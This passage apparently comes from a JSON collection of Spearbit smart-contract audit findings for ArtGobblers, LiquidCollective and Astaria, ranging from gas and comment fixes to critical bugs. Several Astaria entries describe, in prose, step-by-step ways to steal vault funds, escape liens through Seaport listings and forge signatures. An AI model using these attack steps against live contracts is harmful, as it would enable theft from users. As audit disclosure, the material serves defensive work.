will have trouble decoding them. Note: It is likely that the use of toString() in ArtGobblers will not be impacted by the above issues. However, these issues can become severe if LibString is used as a generic string library.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Consider migrating all require statements to Custom Errors for gas optimization, better UX, DX and code consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "There is a mixed usage of both require and Custom Errors to handle cases where the transaction must revert. We suggest replacing all require instances with Custom Errors in order to save gas and improve user / developer experience. The following is a list of contract functions that still use require statements:  ArtGobblers mintLegendaryGobbler  ArtGobblers safeBatchTransferFrom  ArtGobblers safeTransferFrom  SignedWadMath wadLn  GobblersERC1155B balanceOfBatch  GobblersERC1155B _mint  GobblersERC1155B _batchMint  PagesERC721 ownerOf  PagesERC721 balanceOf  PagesERC721 approve  PagesERC721 transferFrom  PagesERC721 safeTransferFrom  PagesERC721 safeTransferFrom (overloaded version)",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Minting of Gobbler and Pages can be further gas optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Currently, in order to mint a new Page or Gobbler users must have enough $GOO in their Goo contract balance. If the user does not have enough $GOO he/she must call ArtGobblers.removeGoo(amount) to remove the required amount from the Gobbler's balance and mint new $GOO. That $GOO will be successively burned to mint the Page or Gobbler. In the vast majority of cases users will never have $GOO in the Goo contract but will have their $GOO directly stacked inside their Gobblers to compound and maximize the outcome. Given these premises, it makes sense to implement a function that does not require users to make two distinct transactions to perform:  mint $GOO (via removeGoo).  burn $GOO + mint the Page/Gobbler (via mintFromGoo). 7 but rather use a single transaction that consumes the $GOO stacked on the Gobbler itself without ever minting and burning any $GOO from the Goo contract. By doing so, the user will perform the mint operation with only one transaction and the gas cost will be much lower because it does not require any interaction with the Goo contract.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Declare GobblerReserve artGobblers as immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The artGobblers in the GobblerReserve can be declared as immutable to save gas. - ArtGobblers public artGobblers; + ArtGobblers public immutable artGobblers;",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Neither GobblersERC1155B nor ArtGobblers implement the ERC-165 supportsInterface function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "From the EIP-1155 documentation: Smart contracts implementing the ERC-1155 standard MUST implement all of the functions in the ERC1155 interface. Smart contracts implementing the ERC-1155 standard MUST implement the ERC- 165 supportsInterface function and MUST return the constant value true if 0xd9b67a26 is passed through the interfaceID argument. Neither GobblersERC1155B nor ArtGobblers are actually implementing the ERC-165 supportsInterface function. implementing the required ERC-165 supportsInterface function in the",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "LogisticVRGDA is importing wadExp from SignedWadMath but never uses it",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The LogisticVRGDA is importing the wadExp function from the SignedWadMath library but is never used.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pages.tokenURI does not revert when pageId is the ID of an invalid or not minted token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The current implementation of tokenURI in Pages is returning an empty string if the pageId specified by the user's input has not been minted yet (pageId > currentId). Additionally, the function does not correctly handle the case of a special tokenId equal to 0, which is an invalid token ID given that the first mintable token would be the one with ID equal to 1. The EIP-721 documentation specifies that the contract should revert in this case: Throws if _tokenId is not a valid NFT. URIs are defined in RFC 3986.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider checking if the token fed to the Gobbler is a real ERC1155 or ERC721 token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The current implementation of ArtGobblers.feedArt function allows users to specify from the value of the bool isERC1155 input parameter if the id passed is from an ERC721 or ERC1155 type of token. Without checking if the passed nft address fully support ERC721 or ERC1155 these two problems could arise:  The user can feed to a Gobbler an arbitrary ERC20 token by calling gobblers.feedArt(1, address(goo), 100, false);. In this example, we have fed 100 $GOO to the gobbler.  By just implementing safeTransferFrom or transferFrom in a generic contract, the user can feed tokens that cannot later be rendered by a Dapp because they do not fully support ERC721 or ERC1155 standard.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rounding down in legendary auction leads to legendaryGobblerPrice being zero earlier than the auction interval",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The expression below rounds down. startPrice * (LEGENDARY_AUCTION_INTERVAL - numMintedSinceStart)) / LEGENDARY_AUCTION_INTERVAL In particular, this expression has a value 0 when numMintedSinceStart is between 573 and 581 (LEGENDARY_- AUCTION_INTERVAL).",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos in code comments or natspec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Below is a list of typos encountered in the code base and / or natspec comments:  In both Pages.sol#L179 and Pages.sol#L188 replace compromise with comprise  In Pages.sol#L205 replace pages's URI with page's URI  In LogisticVRGDA.sol#L23 replace effects with affects  In VRGDA.sol#L34 replace actions with auctions  In ArtGobblers.sol#L54, ArtGobblers.sol#L745 and ArtGobblers.sol#L754 replace compromise with comprise  In ArtGobblers.sol#L606 remove the double occurrence of the word state  In ArtGobblers.sol#L871 replace emission's with emission  In ArtGobblers.sol#L421 replace gobblers is minted with gobblers are minted and until all legen- daries been sold with until all legendaries have been sold  In ArtGobblers.sol#L435-L436 replace gobblers where minted with gobblers were minted and if auc- tion has not yet started with if the auction has not yet started  In ArtGobblers.sol#L518 replace overflow we've got bigger problems with overflow, we've got big- ger problems  In ArtGobblers.sol#L775 and ArtGobblers.sol#L781 replace get emission emissionMultiple with get emissionMultiple",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing natspec comments for contract's constructor, variables or functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Some of the contract's constructor variables and functions are missing natespec comments. Here is the full list of them:  Pages constructor  Pages getTargetSaleDay function  LibString toString function  MerkleProofLib verify function  SignedWadMath toWadUnsafe function  SignedWadMath unsafeWadMul function  SignedWadMath unsafeWadDiv function  SignedWadMath wadMul function  SignedWadMath wadDiv function  SignedWadMath wadExp function  SignedWadMath wadLn function  SignedWadMath unsafeDiv function  VRGDA constructor  LogisticVRGDA constructor  LogisticVRGDA getTargetDayForNextSale  PostSwitchVRGDA constructor  PostSwitchVRGDA getTargetDayForNextSale  GobblerReserve artGobblers  GobblerReserve constructor  GobblersERC1155B contract is missing natspec's coverage for most of the variables and functions  PagesERC721 contract is missing natspec's coverage for most of the variables and functions  PagesERC721 isApprovedForAll should explicity document the fact that the ArtGobbler contract is always pre-approved  ArtGobblers chainlinkKeyHash variable  ArtGobblers chainlinkFee variable  ArtGobblers constructor  ArtGobblers gobblerPrice miss the @return natspec  ArtGobblers legendaryGobblerPrice miss the @return natspec  ArtGobblers requestRandomSeed miss the @return natspec  ArtGobblers fulfillRandomness miss both the @return and @param natspec  ArtGobblers uri miss the @return natspec  ArtGobblers gooBalance miss the @return natspec  ArtGobblers mintReservedGobblers miss the @return natspec  ArtGobblers getGobblerEmissionMultiple miss the @return natspec 11  ArtGobblers getUserEmissionMultiple miss the @return natspec  ArtGobblers safeBatchTransferFrom miss all natspec  ArtGobblers safeTransferFrom miss all natspec  ArtGobblers transferUserEmissionMultiple miss @notice natspec",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Potential issues due to slippage when minting legendary gobblers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The price of a legendary mint is a function of the number of gobblers minted from goo. Because of the strict check that the price is exactly equal to the number of gobblers supplied, this can lead to slippage issues. That is, if there is a transaction that gets mined in the same block as a legendary mint, and before the call to mintLegendaryGobbler, the legendary mint will revert. uint256 cost = legendaryGobblerPrice(); if (gobblerIds.length != cost) revert IncorrectGobblerAmount(cost);",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Users who claim early have an advantage in goo production",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The gobblers are revealed in ascending order of the index in revealGobblers. However, there can be cases when this favours users who were able to claim early: 1. There is the trivial case where a user who claimed a day earlier will have an advantage in gooBalance as their emission starts earlier. 2. For users who claimed the gobblers on the same day (in the same period between a reveal) the advantage depends on whether the gobblers are revealed in the same block or not. 1. If there is a large number of gobbler claims between two aforementioned gobblers, then it may not be possible to call revealGobblers, due to block gas limit. 2. A user at the beginning of the reveal queue may call revealGobblers for enough indices to reveal their gobbler early. In all of the above cases, the advantage is being early to start the emission of the Goo.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add a negativity check for decayConstant in the constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Price is designed to decay as time progresses. For this, it is important that the constant decayCon- stant is negative. Since the value is derived using an on-chain logarithm computation once, it is useful to check that the value is negative. Also, typically decay constant is positive, for example, in radioactive decay the negative sign is explicitly added in the function. It is worth keeping the same convention here, i.e., keep decayConstant as a positive number and add the negative sign in getPrice function. However, this may cause a small increase in gas and therefore may not be worth implementing in the end.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consideration on possible Chainlink integration concerns",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The ArtGobbler project relies on the Chainlink v1 VRF service to reveal minted gobblers and assign a random emissionMultiple that can range from 6 to 9. The project has estimated that minting and revealing all gobblers will take about 10 years. In the scenario simulated by the discussion \"Test to mint and reveal all the gobblers\" the number of requestRan- domSeed and fulfillRandomness made to reveal all the minted gobblers were more than 1500. Given the timespan of the project, the number of requests made to Chainlink to request a random number and the fundamental dependency that Chainlink VRF v1 has, we would like to highlight some concerns:  What would happen if Chainlink completely discontinues the Chainlink VRF v1? At the current moment, Chainlink has already released VRF v2 that replaces and enhances VRF v1.  What would happen in case of a Chainlink service outage and for some reason they decide not to pro- cess previous requests? Currently, the ArtGobbler contract does not allow to request a new \"request for randomness\". 13  What if the fulfillRandomness always gets delayed by a long number of days and users are not able to reveal their gobblers? This would not allow them to know the value of the gobbler (rarity and the visual representation) and start compounding $GOO given the fact that the gobbler does not have an emission multiple associated yet.  What if for error or on purpose (malicious behavior) a Chainlink operator calls fulfillRandomness multi- ple times changing the randomSeed during a reveal phase (the reveal of X gobbler can happen in multiple stages)?",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "The function toString() does not return a string aligned to a 32-byte word boundary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "It is a good practice to align memory regions to 32-byte word boundaries. This is not necessarily the case here. However, we do not think this can lead to issues.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Considerations on Legendary Gobbler price mechanics",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The auction price model is made in a way that starts from a startPrice and decays over time. Each time a new action starts the price time will be equal to max(69, prevStartPrice * 2). Users in this case are incentivized to buy the legendary gobbler as soon as the auction starts because by doing so they are going to burn the maximum amount allowed of gobblers, allowing them to maximize the final emission multiple of the minted legendary gobbler. By doing this, you reach the end goal of maximizing the account's $GOO emissions. By waiting, the cost price of the legendary gobbler decays, and it also decays the emission multiple (because you can burn fewer gobblers). This means that if a user has enough gobblers to burn, he/she will burn them as soon as the auction starts. Another reason to mint a legendary gobbler as soon as the auction starts (and so burn as many gobblers as possible) is to make the next auction starting price as high as possible (always for the same reason, to be able to maximize the legendary gobbler emissions multiple). The next auction starting price is determined by legendaryGobblerAuctionData.startPrice = uint120(cost < 35 ? 69 : cost << 1); These mechanisms and behaviors can result in the following consequences:  Users that will have a huge number of gobblers will burn them as soon as possible, disallowing others that can't afford it to wait for the price to decay.  There will be less and less \"normal\" gobblers available to be used as part of the \"art\" aspect of the project. In the discussion \"Test to mint and reveal all the gobblers\" we have simulated a scenario in which a whale would be interested to collect all gobblers with the end goal of maximizing $GOO production. In that scenario, when the last Legendary Gobbler is minted we have estimated that 9644 gobbler have been burned to mint all the legendaries. 14",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define a LEGENDARY_GOBBLER_INITIAL_START_PRICE constant to be used instead of hardcoded 69",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "69 is currently the starting price of the first legendary auction and will also be the price of the next auction if the previous one (that just finished) was lower than 35. There isn't any gas benefit to use a constant variable but it would make the code cleaner and easier to read instead of having hard-coded values directly.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Update ArtGobblers comments about some variable/functions to make them more clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Some comments about state variables or functions could be improved to make them clearer or remove any further doubts. LEGENDARY_AUCTION_INTERVAL /// @notice Legendary auctions begin each time a multiple of these many gobblers have been minted. It could make sense that this comment specifies \"minted from Goo\" otherwise someone could think that also the \"free\" mints (mintlist, legendary, reserved) could count to determine when a legendary auction start. EmissionData.lastTimestamp // Timestamp of last deposit or withdrawal. These comments should be updated to cover all the scenarios where lastBalance and lastTimestamp are up- dated. Currently, they are updated in many more cases for example:  mintLegendaryGobbler  revealGobblers  transferUserEmissionMultiple getGobblerData[gobblerId].emissionMultiple = uint48(burnedMultipleTotal << 1) has an outdated comment. The current present in the mintLegendaryGobbler function has the following comment: line getGobblerData[gobblerId].emissionMultiple = uint48(burnedMultipleTotal << 1) // Must be done before minting as the transfer hook will update the user's emissionMultiple. In both ArtGobblers and GobblersERC1155B there isn't any transfer hook, which could mean that the referred comment is referencing outdated code. We suggest removing or updating the comment to reflect the current code implementation. legendaryGobblerPrice numMintedAtStart calculation. 15 The variable numMintedAtStart is calculated as (numSold + 1) * LEGENDARY_AUCTION_INTERVAL The comment above the formula does not explain why it uses (numSold + 1) instead of numSold. This reason is correctly explained by a comment on LEGENDARY_AUCTION_INTERVAL declaration. It would be better to also update the comment related to the calculation of numMintedAtStart to explain why the current formula use (numSold + 1) instead of just numSold transferUserEmissionMultiple The above utility function transfers an amount of a user's emission's multiple to another user. Other than transfer- ring that emission amount, it also updates both users lastBalance and lastTimestamp The natspec comment should be updated to cover this information.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mark functions not called internally as external to improve code quality",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The following functions could be declared as external to save gas and improve code quality:  Goo.mintForGobblers  Goo.burnForGobblers  Goo.burnForPages  GobblerReserve.withdraw",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Schedule amounts cannot be revoked or released",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "The migration for schedule ids 9 to 12 has the following parameters: // 9 -> 12 migrations[3] = VestingScheduleMigration({ scheduleCount: 4, newStart: 0, newEnd: 1656626400, newLockDuration: 72403200, setCliff: true, setDuration: true, setPeriodDuration: true, ignoreGlobalUnlock: false }); The current start is 7/1/2022 0:00:00 and the updated/migrated end value would be 6/30/2022 22:00:00, this will cause _computeVestedAmount(...) to always return 0 where one is calculating the released amount due to capping the time by the end timestamp. And thus tokens would not be able to be released. Also these tokens cannot be revoked since the set [start, end] where end < start would be empty.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A revoked schedule might be able to be fully released before the 2 year global lock period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "The unlockedAmount calculated in _computeGlobalUnlocked(...) is based on the original sched- uledAmount. If a creator revokes its revocable vesting schedule and change the end time to a new earlier date, this formula does not use the new effective amount (the total vested amount at the new end date). And so one might be able to release the vested tokens before 2 years after the lock period.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unlock date of certain vesting schedules does not meet the requirement",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "All vesting schedules should have the unlock date (start + lockDuration) set to 16/10/2024 0:00 GMT+0 post-migration. The following is the list of vesting schedules whose unlock date does not meet the requirement post-migration: Index Unlock Date 19,21,23 16/10/2024 9:00 GMT+0 36-60 16/10/2024 22:00 GMT+0",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ERC20VestableVotesUpgradeableV1._computeVestingReleasableAmount: Users VestingSchedule.releasedAmount > globalUnlocked will be temporarily denied of service with",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "The current version of the code introduces a new concept; global unlocking. The idea is that wher- ever IgnoreGlobalUnlockSchedule is set to false, the releasable amount will be the minimum value between the original vesting schedule releasable amount and the global unlocking releasable amount (the constant rate of VestingSchedule.amount / 24 for each month starting at the end of the locking period). The implementa- tion ,however, consists of an accounting error caused by a wrong implicit assumption that during the execution of _computeVestingReleasableAmount globalUnlocked should not be less than releasedAmount. In reality, how- In that case globalUnlocked - ever, this state is possible for users that had already claimed vested tokens. releasedAmount will revert for an underflow causing a delay in the vesting schedule which in the worst case may last for two years. Originally this issue was meant to be classified as medium risk but since the team stated that with the current deployment, no tokens will be released whatsoever until the upcoming upgrade of the TLC contract, we decided to classify this issue as low risk instead.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TlcMigration.migrate: Missing input validation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "The upcoming change in some of the vesting schedules is going to be executed via the migrate function which at the current version of the code is missing necessary validation checks to make sure no erroneous values are inserted.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Optimise the release amount calculation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "In the presence of a global lock schedule one calculates the release amount as: LibUint256.min(vestedAmount - releasedAmount, globalUnlocked - releasedAmount)",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use msg.sender whenever possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "checked to be equal to msg.sender: In this context the parameters vestingSchedule.{creator, beneficiary} have already been if (msg.sender != vestingSchedule.X) { revert LibErrors.Unauthorized(msg.sender); }",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Test function testMigrate uses outdated values for assertion",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "In commit fbcc4ddd6da325d60eda113c2b0e910aa8492b88, the newLockDuration values were up- dated in TLC_globalUnlockScheduleMigration.sol. However, the testMigrate function was not updated ac- cordingly and still compares schedule.lockDuration to the outdated newLockDuration values, resulting in failing assertions.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rounding Error in Unlocked Token Amount Calculation at ERC20VestableVotesUpgradea- ble.1.sol#L458",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "There is a rounding error in calculating the unlocked amount, which may lead to minor discrepancies in the tokens available for release.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "It might take longer than 2 years to release all the vested schedule amount after the lock period ends",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "It is possible that in the presence of the global lock, releasing the total vested value might take longer than 2 years if the lockDuration + 2 years is comparatively small when compared to duration (or start - end). We just know that after 2 years all the scheduled amount can be released but only a portion of it might have been vested.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "_computeVestingReleasableAmount's_time input parameter can be removed/inlined",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "At both call sites to _computeVestingReleasableAmount(...), time is _getCurrentTime().",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "LienToken.transferFrom does not update a public vault's bookkeeping parameters when a lien is transferred to it.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When transferFrom is called, there is not check whether the from or to parameters could be a public vault. Currently, there is no mechanism for public vaults to transfer their liens. But private vault owners who are also owners of the vault's lien tokens, they can call transferFrom and transfer their liens to a public vault. In this case, we would need to make sure to update the bookkeeping for the public vault that the lien was transferred to. On the LienToken side, s.LienMeta[id].payee needs to be set to the address of the public vault. And on the PublicVault side, yIntercept, slope, last, epochData of VaultData need to be updated (this requires knowing the lien's end). However, private vaults do not keep a record of these values, and the corresponding values are only saved in stacks off-chain and validated on-chain using their hash.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Anyone can take a valid commitment combined with a self-registered private vault to steal funds from any vault without owning any collateral",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The issue stems from the following check in VaultImplementation._validateCommitment(params, receiver): if ( msg.sender != holder && receiver != holder && receiver != operator && !ROUTER().isValidVault(receiver) // <-- the problematic condition ) { ... In this if block if receiver is a valid vault the body of the if is skipped. A valid vault is one that has been registered in AstariaRouter using newVault or newPublicVault. So for example any supplied private vault as a receiver would be allowed here and the call to _validateCommitment will continue without reverting at least in this if block. If we backtrack function calls to _validateCommitment, we arrive to 3 exposed endpoints:  commitToLiens  buyoutLien  commitToLien A call to commitToLiens will end up having the receiver be the AstariaRouter. A call to buyoutLien will set the receiver as the recipient() for the vault which is either the vault itself for public vaults or the owner for private vaults. So we are only left with commitToLien, where the caller can set the value for the receiver directly. 8 A call to commitToLien will initiate a series of function calls, and so receiver is only supplied to _validateCommit- ment to check whether it is allowed to be used and finally when transferring safeTransfer) wETH. This opens up exploiting scenarios where an attacker: 1. Creates a new private vault by calling newVault, let's call it V . 2. Takes a valid commitment C and combines it with V and supply those to commitToLien. 3. Calls withdraw endpoint of V to withdraw all the funds. For step 2. the attacker can source valid commitments by doing either of the following: 1. Frontrun calls to commitToLiens and take all the commitments C0, (cid:1) (cid:1) (cid:1) , Cn and supply them one by one along with V to commitToLien endpoint of the vault that was specified by each Ci . 2. Frontrun calls to commitToLien endpoints of vaults, take their commitment C and combine it with V to send to commitToLien. 3. Backrun the either scenarios from the above points and create a new commitment with new lien request that tries to max out the potential debt for a collateral while also keeping other inequalities valid (for example, the inequality regarding liquidationInitialAsk).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Collateral owner can steal funds by taking liens while asset is listed for sale on Seaport",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "We only allow collateral holders to call listForSaleOnSeaport if they are listing the collateral at a price that is sufficient to pay back all of the liens on their collateral. When a new lien is created, we check that collateralStateHash != bytes32(\"ACTIVE_AUCTION\") to ensure that the collateral is able to accept a new lien. However, calling listForSaleOnSeaport does not set the collateralStateHash, so it doesn't stop us from taking new liens. As a result, a user can deposit collateral and then, in one transaction:  List the asset for sale on Seaport for 1 wei.  Take the maximum possible loans against the asset.  Buy the asset on Seaport for 1 wei. The 1 wei will not be sufficient to pay back the lenders, and the user will be left with the collateral as well as the loans (minus 1 wei).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "validateStack allows any stack to be used with collateral with no liens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The validateStack modifier is used to confirm that a stack entered by a user matches the stateHash in storage. However, the function reverts under the following conditions: if (stateHash != bytes32(0) && keccak256(abi.encode(stack)) != stateHash) { revert InvalidState(InvalidStates.INVALID_HASH); } The result is that any collateral with stateHash == bytes32(0) (which is all collateral without any liens taken against it yet) will accept any provided stack as valid. This can be used in a number of harmful ways. Examples of vulnerable endpoints are:  createLien: If we create the first lien but pass a stack with other liens, those liens will automatically be included in the stack going forward, which means that the collateral holder will owe money they didn't receive.  makePayment: If we make a payment on behalf of a collateral with no liens, but include a stack with many liens (all owed to me), the result will be that the collateral will be left with the remaining liens continuing to be owed  buyoutLien: Anyone can call buyoutLien(...) and provide parameters that are spoofed but satisfy some constraints so that the call would not revert. This is currently possible due to the issue in this context. As a consequence the caller can  _mint any unminted liens which can DoS the system.  _burn lienIds that they don't have the right to remove.  manipulate any public vault's storage (if it has been set as a payee for a lien) through its handleBuyout- Lien. It seems like this endpoint might have been meant to be a restricted endpoint that only registered vaults can call into. And the caller/user is supposed to only call into here from VaultImplementa- tion.buyoutLien.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "A borrower can list their collateral on Seaport and receive almost all the listing price without paying back their liens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When the collateral s.auctionData is not populated and thus, function gets called since stack.length is 0, this loop will not run and no payment is sent to the lending vaults. The rest of the payment is sent to the borrower. And the collateral token and its related data gets burnt/deleted by calling settleAuction. The lien tokens and the vaults remain untouched as though nothing has happened. is listed on SeaPort by the borrower using listForSaleOnSeaport, if that order gets fulfilled/matched and ClearingHouse's fallback So basically a borrower can: 1. Take/borrow liens by offering a collateral. 2. List their collateral on SeaPort through the listForSaleOnSeaport endpoint. 3. Once/if the SeaPort order fulfills/matches, the borrower would be paid the listing price minus the amount sent to the liquidator (address(0) in this case, which should be corrected). 4. Collateral token/data gets burnt/deleted. 5. Lien token data remains and the loans are not paid back to the vaults. And so the borrower could end up with all the loans they have taken plus the listing price from the SeaPort order. Note that when a user lists their own collateral on Seaport, it seems that we intentionally do not kick off the auction process:  Liens are continued.  Collateral state hash is unchanged.  liquidator isn't set.  Vaults aren't updated.  Withdraw proxies aren't set, etc. Related issue 88.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Phony signatures can be used to forge any strategy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _validateCommitment(), we check that the merkle root of the strategy has been signed by the strategist or delegate. After the signer is recovered, the following check is performed to validate the signature: recovered != owner() && recovered != s.delegate && recovered != address(0) 11 This check seems to be miswritten, so that any time recovered == address(0), the check passes. When ecrecover is used to check the signed data, it returns address(0) in the situation that a phony signature is submitted. See this example for how this can be done. The result is that any borrower can pass in any merkle root they'd like, sign it in a way that causes address(0) to return from ecrecover, and have their commitment validated.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Inequalities involving liquidationInitialAsk and potentialDebt can be broken when buyoutLien is called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
